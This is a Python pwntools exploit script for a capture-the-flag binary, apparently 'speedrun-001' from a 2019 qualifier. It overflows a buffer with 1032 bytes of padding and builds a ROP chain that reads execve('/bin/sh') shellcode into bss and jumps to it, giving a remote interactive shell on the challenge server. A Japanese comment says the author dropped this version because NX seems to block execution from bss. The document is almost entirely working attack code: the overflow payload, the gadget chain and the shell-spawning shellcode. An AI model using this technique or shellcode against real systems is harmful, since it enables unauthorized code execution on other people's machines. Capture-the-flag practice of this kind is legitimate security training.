#!/usr/bin/env python
# NXビットが有効だからか、bss領域が実行できないっぽいのでボツ
from pwn import *
import time


def main():
    # conn = process("./speedrun-001")
    conn = remote("speedrun-001.quals2019.oooverflow.io", 31337)
    # conn = remote("localhost", 3000)
    bss_addr = 0x6bbae0
    pop_rdx_ret = 0x4498b5  # pop rdx ; ret
    pop_rsi_ret = 0x4101f3  # pop rsi ; ret
    pop_rdi_ret = 0x400686  # pop rdi ; ret
    # xor_rax_rax_ret = 0x444bc0  # xor rax, rax ; ret
    read_addr = 0x4498a0

    shellcode = "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54\x5f\xb0\x3b\x31\xd2\x0f\x05" # 22 bytes

    payload = "A" * 1032
    payload += p64(pop_rdi_ret)
    payload += p64(0)
    payload += p64(pop_rsi_ret)
    payload += p64(bss_addr)
    payload += p64(pop_rdx_ret)
    payload += p64(23)
    # payload += p64(xor_rax_rax_ret)
    payload += p64(read_addr)
    payload += p64(bss_addr)

    print conn.recvuntil("Any last words?\n")

    conn.sendline(payload)

    time.sleep(0.1)
    conn.sendline(shellcode)
    conn.interactive()


if __name__ == "__main__":
    main()
